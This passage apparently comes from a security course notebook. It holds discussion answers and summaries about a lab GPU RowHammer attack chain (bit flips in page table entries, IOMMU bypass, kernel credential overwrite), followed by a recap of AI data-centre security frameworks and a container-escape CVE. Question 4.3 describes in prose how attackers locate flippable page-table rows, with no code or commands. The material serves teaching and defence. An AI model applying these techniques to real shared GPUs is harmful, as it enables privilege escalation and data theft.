# Discuss the following with your partner and then with a TA. These
# questions connect the lab numbers back to real-world attack economics.

# <details>
# <summary><b>Question 4.1:</b> In the lab we saw a flip land in ~20ms against a 64ms window — comfortable headroom. What about the real world?</summary>

# In the GPUHammer paper, on an RTX 3080 the authors measured ~9ms to the
# first flip on double-sided patterns against tREFW ≈ 32ms — about a 3×
# safety margin. On A100s the margin is smaller (and ECC complicates
# things) but still positive. Mitigations that multiply the refresh rate
# by 2× eat bandwidth and do not close the gap; mitigations like pTRR
# (probabilistic Target Row Refresh) have been shown to be bypassable with
# more careful activation patterns.

# The headroom is *shrinking* with each process node because cells are
# smaller → leak faster → lower activation threshold, while tREFW barely
# changes. The trend line is against the defender.
# </details>


# <details>
# <summary><b>Question 4.2:</b> Why is the IOMMU, which we all rely on for DMA isolation, not the right tool here?</summary>

# Page granularity. The IOMMU's abstraction is "may device X touch
# physical page P?", which is the right abstraction for malicious or buggy
# devices writing to unrelated memory. It is the wrong abstraction for a
# bug-within-a-mapped-page, because software — the driver — subdivides the
# page into objects and owns the sub-page bounds. Moving the cred struct
# out of that page (SLAB hardening, per-cred page allocations) is the
# correct structural mitigation; IOMMU tweaks are not.
# </details>

# <details>
# <summary><b>Question 4.3:</b> How would a real attacker find the target PTE row from an unprivileged process?</summary>

# They combine several techniques:

# * **Templating** — run an offline characterisation of the target GPU in a
#   CI environment or on their own hardware to build a map of "these
#   (row, column, bit) locations flip reliably under this hammer pattern."
#   In GPUHammer the template is sold as a probability distribution over
#   bit flips per sub-page, good enough to find PTEs with the desired
#   aperture-bit alignment.
# * **Memory massaging** — spray GPU allocations with controlled page
#   tables via CUDA, OpenGL, or Vulkan, until a PT page lands in a row
#   the template says is flippable. This is statistical but typically
#   reliable within a few seconds on an idle GPU.
# * **Side-channel row identification** — on some GPUs, DRAM access
#   patterns leak via timing (row-buffer hits vs misses). An unprivileged
#   kernel can measure this to learn which virtual pages are co-located
#   in the same DRAM row.
# * **Information-leak primitives in the driver** — many GPU drivers
#   historically expose uninitialised VRAM or residual memory through
#   compute shaders, which lets the attacker read PTE bits directly.

# Defence-in-depth: isolate tenant GPUs, use MIG on NVIDIA, or put the
# sensitive workload inside a Confidential VM with a signed GPU partition.
# </details>
# """

# %%
"""
## GPUBreach Summary

You implemented an end-to-end GPUBreach-style attack chain:

1. **RowHammer** - Flipped a GPU DRAM bit within the refresh window
2. **Aperture corruption** - Redirected GPU virtual address from VRAM to system memory
3. **IOMMU bypass** - Leveraged legitimate page mapping for malicious DMA
4. **Privilege escalation** - Overwrote kernel credentials via buffer overflow

### Key Takeaways

- RowHammer is practical against GPU memory with comfortable timing margins
- Single bit flips in page table entries change memory access semantics
- IOMMU operates at page granularity, not sub-page buffer boundaries
- Defense requires structural changes: SLAB hardening, GPU isolation, refresh tuning

### Further Reading

- [GPUHammer: RowHammer Attacks on GPU Memories are Practical](https://gpuhammer.com/)
- [Flipping Bits in Memory Without Accessing Them](https://users.ece.cmu.edu/~yoonguk/papers/kim-isca14.pdf)
- [Exploiting the DRAM rowhammer bug to gain kernel privileges](https://googleprojectzero.blogspot.com/2015/03/exploiting-dram-rowhammer-bug-to-gain.html)

---

## Final Summary

This comprehensive day covered three critical dimensions of AI infrastructure security:

### Key Takeaways

- **RAND framework**: OC1-OC5 threat actors and SL1-SL5 progressive controls give a structured way to match defenses to adversary capability. Model weights are uniquely sensitive — unlike traditional IP, they are immediately executable and high-value at terabyte scale.
- **IAPS policy lens**: Three critical attack vectors (side-channel, supply chain, weight exfiltration) and a four-point policy framework (standards, R&D, intelligence sharing, supply chain decoupling) coordinate government-industry response. Current data center practices are insufficient for AI-specific threats.
- **SL5 novel controls**: Five security domains (supply chain, network, machine, physical, personnel) require coordinated novel approaches. Reaching SL5 demands a *radical reduction* in trusted hardware/software components, and the document's 3-6 month feasibility assessment is the practical entry point for planning.
- **Vulnerability Research**: CVE-2025-23266 shows how LD_PRELOAD container escapes break trust-boundary assumptions in GPU container runtimes — namespaces/cgroups/seccomp don't protect host-side toolkit execution.
- **Attack Chain Implementation**: GPUBreach chains RowHammer → aperture bit flip → IOMMU bypass → kernel cred overwrite. Single bit flips in PTEs change memory-access semantics, and the IOMMU's page granularity leaves sub-page OOB writes unblocked.

### Implementation Priorities for Your Organization

- [ ] **Immediate (0-6 months)**: Implement container image signing and GPU access controls, update NVIDIA Container Toolkit to latest versions
- [ ] **Short-term (6-18 months)**: Deploy enhanced monitoring for GPU workloads, establish incident response procedures for AI infrastructure
- [ ] **Medium-term (1-3 years)**: Evaluate SL3+ security controls, implement hardware-based GPU isolation where feasible
- [ ] **Long-term (3-5 years)**: Plan for next-generation AI-specific security architecture aligned with SL5 recommendations

### Further Reading

**Policy and Framework Documents:**
- RAND Corporation: "Securing AI Model Weights" - https://www.rand.org/content/dam/rand/pubs/research_reports/RRA2800/RRA2849-1/RAND_RRA2849-1.pdf
- IAPS Research: "Accelerating AI Data Center Security" - https://www.iaps.ai/research/accelerating-ai-data-center-security
- NIST AI Risk Management Framework - https://www.nist.gov/itl/ai-risk-management-framework

**Vulnerability Research:**
- Wiz CVE-2025-23266 Analysis - https://www.wiz.io/blog/nvidia-ai-vulnerability-cve-2025-23266-nvidiascape
- NVIDIA Security Advisories - https://www.nvidia.com/en-us/security/
- Container Escape Techniques - OWASP Container Security Guide

**GPU Security Research:**
- GPUHammer: RowHammer Attacks on GPU Memories - https://gpuhammer.com/
- GPU Side-Channel Attacks - https://leakcanary.net/
- AI Hardware Security - https://aivillage.org/large%20language%20models/threat-modeling-llm/

**Implementation Resources:**
- NVIDIA Container Toolkit Security Guide
- Kubernetes GPU Device Plugin Security
- Docker Security Best Practices for AI Workloads
"""